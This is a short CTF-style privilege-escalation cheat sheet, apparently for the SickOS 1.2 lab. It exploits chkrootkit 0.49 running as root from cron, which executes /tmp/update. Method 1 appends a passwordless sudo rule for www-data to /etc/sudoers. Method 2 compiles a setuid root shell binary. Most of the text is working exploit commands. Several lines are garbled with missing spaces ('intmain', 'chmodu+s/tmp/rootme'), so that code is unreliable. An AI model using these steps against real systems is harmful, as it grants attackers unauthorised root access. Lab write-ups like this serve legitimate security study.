# SCENARIO:
## Can write any file that  will be excecutes as root (ie with cron):
### (in this case: chrootkit exploit)

### METHOD 1:

After some research, it has a known vulnerability and can be exploited. I used the following exploit: https://www.exploit-db.com/exploits/33899/
```
	$ echo ‘chmod 777 /etc/sudoers && echo “www-data ALL=NOPASSWD: ALL” >> /etc/sudoers && chmod 440 /etc/sudoers’ > /tmp/update
  ```

	A file update would be created in /tmp/. Give that file the following permissions:
  ```
	$ chmod 777 /tmp/update
  ```
	Once done, wait for a couple of minutes and then type:
  ```
	$ sudo su
  ```

Now we have root! Let us head over and read the flag.

### METHOD 2:

http://ch3rn0byl.com/sickos-1-2-walkthrough/

So after doing enumeration on the machine, we can see that there is a “chkrootkit” inside cron.daily. The interesting thing about this is that it’s version 0.49. According to Exploit-DB, if you place a file called “update” in /tmp, chkrootkit will run it with root privileges. Very nice.
Sooo…let’s escalate our privs!
First thing I did was create a little, stupid simple program that sets the setgid and setuid and then spawns a shell. After this, I take advantage of update to set root ownership of this simple, yet deadly binary that will allow me to run it >:D
If all goes well, I will now have a simple tool of mass destruction waiting for me in /tmp.

```
www-data@ubuntu:/tmp$   cat<<EOF>root.c
>intmain(void)
>{
>setgid(0);
>setuid(0);
>execl("/bin/sh","sh",0);
>}
>EOF
```
```
www-data@ubuntu:/tmp$   gcc root.c -o rootme
```
```

www-data@ubuntu:/tmp$   cat<<EOF>update
>#!/bin/bash
>
>chown root/tmp/rootme
>chgrp root/tmp/rootme
>chmodu+s/tmp/rootme
>
>EOF
```
```

www-data@ubuntu:/tmp$   chmod+x update
```


Now, after waiting a minute or so…it’s time to check!

```
www-data@ubuntu:/tmp$ls-al
ls-al
total36
--snip--
-rwsrwxrwx1root     root7235Apr2905:16 rootme
```
Great success!!
